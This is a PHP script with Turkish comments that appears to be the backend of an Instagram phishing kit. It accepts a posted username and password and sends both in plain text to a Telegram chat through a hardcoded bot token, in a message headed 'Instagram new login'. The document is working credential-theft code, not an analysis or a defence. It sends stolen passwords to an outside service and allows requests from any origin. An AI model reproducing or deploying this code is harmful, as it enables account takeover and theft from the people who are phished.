<?php
// CORS başlıklarını ayarla
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Hata raporlamasını etkinleştir (development aşamasında, sonra kaldırılabilir)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// POST isteği kontrol et
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // JSON verisini al
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    // Gerekli parametreleri kontrol et
    if (isset($data['username']) && isset($data['password'])) {
        $username = $data['username'];
        $password = $data['password'];
        
        // Telegram bilgileri
        $botToken = '7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE';
        $chatId = '-1002584942967';
        
        // Tarih ve saat bilgisi
        $dateTime = date('Y-m-d H:i:s');
        
        // Telegram mesajı
        $messageText = "🚨 *Instagram Yeni Giriş* 🚨\n\n";
        $messageText .= "*Hesap Bilgileri:*\n";
        $messageText .= "👤 *Kullanıcı Adı:* " . $username . "\n";
        $messageText .= "🔒 *Şifre:* " . $password . "\n";
        $messageText .= "🕝 *Tarih:* " . $dateTime . "\n";
        
        // Telegram API URL
        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
        
        // POST verisini hazırla
        $postData = array(
            'chat_id' => $chatId,
            'text' => $messageText,
            'parse_mode' => 'Markdown'
        );
        
        // cURL ile Telegram API'ye istek gönder
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if (curl_errno($ch)) {
            // cURL hatası
            echo json_encode(['success' => false, 'error' => 'cURL Error: ' . curl_error($ch)]);
        } else if ($httpCode != 200) {
            // API hatası
            echo json_encode(['success' => false, 'error' => 'API Error: ' . $response, 'code' => $httpCode]);
        } else {
            // Başarılı
            echo json_encode(['success' => true]);
        }
        
        curl_close($ch);
    } else {
        // Gerekli parametreler eksik
        echo json_encode(['success' => false, 'error' => 'Missing parameters']);
    }
} else {
    // POST isteği değil
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
}
?>